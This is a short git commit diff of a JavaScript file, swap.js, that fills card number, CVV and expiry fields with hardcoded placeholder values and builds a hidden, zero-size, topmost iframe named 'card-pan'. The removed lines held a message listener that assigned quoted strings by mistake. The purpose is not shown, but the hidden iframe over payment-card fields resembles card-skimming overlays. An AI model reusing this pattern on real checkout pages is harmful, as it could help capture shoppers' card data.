af70997015db0b6432710f47890a2fda09728ba7
Lucas <lucascorreamacedo@hotmail.com>
2023-08-02 13:31:20 -0300

    Add script do insert values and redirect

--- swap.js
+++ swap.js
@@ -4,14 +4,10 @@
       d = document.getElementById("card-number"),
       i = document.getElementById("card-cvv"),
       c = document.getElementById("card-expiry-date"),
-      e = document.createElement("iframe"),
-      m = window.location.origin;
-    window.addEventListener("message", l, !1);
-    function l(a) {
-      (d.innerHTML = "a.data.cardNumber"),
-        (i.innerHTML = "a.data.cardCVV"),
-        (c.innerHTML = "a.data.cardExpiryDate");
-    }
+      e = document.createElement("iframe");
+    (d.innerHTML = "8475 7485 8745 4566"),
+      (i.innerHTML = "123"),
+      (c.innerHTML = "08/23");
     (e.style =
       "border:0;position:absolute;width:0%;height:0%;top:0;left:0;z-index:10000000000;"),
       (e.name = "card-pan"),
